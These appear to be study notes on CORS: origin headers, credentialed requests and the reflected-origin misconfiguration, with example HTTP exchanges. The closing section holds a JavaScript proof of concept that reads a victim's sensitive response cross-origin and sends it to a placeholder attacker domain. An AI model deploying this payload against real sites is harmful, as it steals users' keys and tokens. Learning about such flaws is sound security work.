# Cross-origin resource sharing (CORS)

https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

https://portswigger.net/web-security/cors

## Definition
- Server indicates other origins that can load its resources
- origins = domain / scheme / port
- Does not protect against CSRF
  - Controlled relaxation of the same origin policy

## How?
- Client sends requests with `origin: example.com` header
- Server responds with `Access-Control-Allow-Origin: example.com` if cors enabled for that site

Example
```
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com

The server on robust-website.com returns the following response:

HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com 
```

## With credentials
- Default behaviour does not include cookies or authorization header
- Can permit cors with these credentials using `Access-Control-Allow-Credentials: true`

```
 GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>

And the response to the request is:

HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true 
```

But cannot be used with `Access-Control-Allow-Origin: * `

## Server generated ACAO
- Some server dynamically read the `origin` header and responds with ACAO allowed for all domains allowed

```
 GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

It then responds with:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
... 
```

If sensitive info such as API keys or CSRF tokens are exposed in the response. It is possible to retrieve it by:
```
 var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
}; 
```
